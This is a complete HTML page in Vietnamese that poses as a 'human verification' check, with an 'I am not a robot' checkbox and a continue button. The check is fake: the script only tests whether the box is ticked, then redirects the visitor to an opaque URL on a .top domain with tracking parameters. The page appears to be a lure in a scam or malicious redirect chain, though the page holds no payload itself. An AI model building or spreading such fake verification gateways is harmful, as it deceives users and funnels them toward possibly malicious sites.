<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xác Minh Con Người</title>

<style>
body{
  background:#0b3d91;
  font-family:Arial,sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
  margin:0;
}

.box{
  background:white;
  padding:40px 28px;
  border-radius:16px;
  text-align:center;
  width:90%;
  max-width:430px;
}

h2{
  font-size:30px;
  margin-bottom:22px;
}

p{
  font-size:21px;
  margin-bottom:24px;
}

label{
  font-size:22px;
}

input[type="checkbox"]{
  width:28px;
  height:28px;
  vertical-align:middle;
  margin-right:10px;
}

button{
  background:#1a73e8;
  color:white;
  border:none;
  padding:18px 45px;
  border-radius:8px;
  font-size:24px;
  font-weight:bold;
  cursor:pointer;
  margin-top:28px;
}

button:hover{
  background:#1557b0;
}
</style>
</head>

<body>

<div class="box">
  <h2>🔒 Xác Minh Con Người</h2>

  <p>Vui lòng xác nhận bạn không phải robot</p>

  <label>
    <input type="checkbox" id="check">
    Tôi không phải Robot
  </label>

  <br>

  <button onclick="go()">TIẾP TỤC</button>
</div>

<script>
function go(){
  if(document.getElementById('check').checked){
    window.location.href='https://a3lm.glthay.top/3499598186/3499598186_index.html?rb=eBJr&tplhx=1';
  }else{
    alert('Vui lòng xác nhận trước');
  }
}
</script>

</body>
</html>
